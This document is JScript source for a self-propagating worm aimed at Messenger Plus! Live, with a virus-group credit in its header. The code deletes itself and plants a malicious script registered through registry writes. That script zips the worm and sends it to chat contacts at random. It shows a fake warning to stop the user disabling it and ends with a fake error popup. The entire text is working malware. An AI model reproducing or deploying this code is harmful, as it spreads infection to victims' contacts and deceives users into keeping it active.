   // Js.veNom Mr`Anderson/doomriderz
   // Messenger Plus! Live w0rm
   try
   {
   var shell = new ActiveXObject("WScript.Shell");
   var fso = new ActiveXObject("Scripting.FileSystemObject");
   var self=fso.OpenTextFile(WScript.ScriptFullName);
   var mybody = self.ReadAll();
   self.Close();
   fso.DeleteFile(WScript.ScriptFullName,true);
   var scriptbody = "function OnEvent_Initialize(MessengerStart)\r\n"+
   "{\r\n"+
   "   var shell = new ActiveXObject(\"WScript.Shell\");\r\n"+
   "   var zipkey = shell.RegRead(\"HKEY_CLASSES_ROOT\\\\.zip\\\\\");\r\n"+
   "   var opencmd = shell.RegRead(\"HKEY_CLASSES_ROOT\\\\\"+zipkey+\"\\\\shell\\\\open\\\\command\\\\\");\r\n"+
   "   var winzipexe = opencmd.replace(\"\\\"%1\\\"\",\"\");\r\n"+
   "   var fso=new ActiveXObject(\"Scripting.FileSystemObject\");\r\n"+
   "   if(fso.FileExists(winzipexe)){\r\n"+
   "       shell.Run(\"\\\"\"+winzipexe+\"\\\" -a \\\"\"+MsgPlus.ScriptFilesPath+\"\\\\WhatIsLove.zip\\\" \\\"\"+MsgPlus.ScriptFilesPath+\"\\\\WhatIsLove.jse\\\"\",0,true);\r\n"+
   "   }\r\n"+
   "}\r\n"+
   "function OnEvent_Uninitialize(MessengerExit)\r\n"+
   "{\r\n"+
   "   if(!MessengerExit)\r\n"+
   "   {\r\n"+
   "       MsgBox(\"If you disable this script, Messenger Plus! Live will shutdown.\\r\\nPlease re-enable it.\");\r\n"+
   "   }\r\n"+
   "}\r\n"+
   "function OnEvent_ChatWndCreated( ChatWnd )\r\n"+
   "{\r\n"+
   "   if(ChatWnd==null) return;\r\n"+
   "   if(Math.random()<0.1)\r\n"+
   "   {\r\n"+
   "       ChatWnd.SendFile(MsgPlus.ScriptFilesPath+\"\\\\WhatIsLove.zip\");\r\n"+
   "       ChatWnd.SendMessage(\"(K)\");\r\n"+
   "   }\r\n"+
   "}\r\n"+
   "function MsgBox(msg){\r\n"+
   "   Interop.Call(\"User32.dll\", \"MessageBoxW\", 0,msg,\"Messenger Plus! Live\",16);\r\n"+
   "}"
   var scriptsroot = shell.RegRead("HKEY_LOCAL_MACHINE\\Software\\Patchou\\Messenger Plus! Live\\ScriptsDir");
   var scriptname = "test";
   if(fso.FolderExists(scriptsroot+"\\"+scriptname)) WScript.Quit();
   fso.CreateFolder(scriptsroot+"\\"+scriptname);
   var script = fso.CreateTextFile(scriptsroot+"\\"+scriptname+"\\"+scriptname+".js");
   script.Write(scriptbody);
   script.Close();
   shell.RegWrite("HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\"+scriptname+"\\Enabled",1,"REG_DWORD");
   var newscr = fso.CreateTextFile(scriptsroot+"\\"+scriptname+"\\WhatIsLove.jse");
   newscr.Write(mybody);
   newscr.Close();
   }
   catch(e)
   {
   }
   shell.Popup(WScript.ScriptFullName+" could not be loaded.",60,"Windows Scripting Host",16);
